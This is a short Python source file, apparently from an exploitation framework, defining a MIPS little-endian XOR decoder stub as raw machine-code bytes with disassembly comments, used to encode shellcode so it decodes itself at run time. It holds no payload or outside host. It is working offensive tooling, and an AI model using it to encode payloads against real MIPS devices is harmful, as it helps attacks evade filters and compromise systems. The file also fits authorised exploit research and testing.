import string

from ...common.support import BigEndian,LittleEndian

class MipsXorEncoder:
    decoders={}
    decoders[LittleEndian] = string.join([ 
        "\xfb\xff\x0e\x34",    # li	t6,0xfffb
        "\x27\x70\xc0\x01",    # nor	t6,t6,zero
        "\xb7\xff\x0b\x24",    # li	t3,-73
        "\xff\xff\x08\x20",    # addi	t0,zero,-1
        "\xff\xff\x10\x05",    # bltzal	t0,10 <next>
        "\x82\x82\x08\x28",    # slti	t0,zero,-32126
        "\x27\x58\x60\x01",    # nor	t3,t3,zero
        "\x21\xc8\xeb\x03",    # addu	t9,ra,t3
        "\x82\x82\x17\x28",    # slti	s7,zero,-32126
        "\xfc\xff\x31\x8f",    # lw	s1,-4(t9)
        "\xfb\xff\x0d\x24",    # li	t5,-5
        "\x27\x68\xa0\x01",    # nor	t5,t5,zero
        "\xfd\xff\xaf\x21",    # addi	t7,t5,-3
        "\xfc\xff\x28\x8f",    # lw	t0,-4(t9)
        "\x21\xb8\xef\x02",    # addu	s7,s7,t7
        "\x26\x18\x11\x01",    # xor	v1,t0,s1
        "\x2b\xf0\xee\x02",    # sltu	s8,s7,t6
        "\xfc\xff\x23\xaf",    # sw	v1,-4(t9)
        "\xfa\xff\x1e\x14",    # bne	zero,s8,38 <loop>
        "\xff\xff\xa6\x21",    # addi	a2,t5,-1
        "\x21\xc8\x2d\x03",    # addu	t9,t9,t5
        "\x33\x10\x02\x24",    # li	v0,4147
        "\x0c\x54\x4a\x01"     # syscall	0x52950
        ],'')


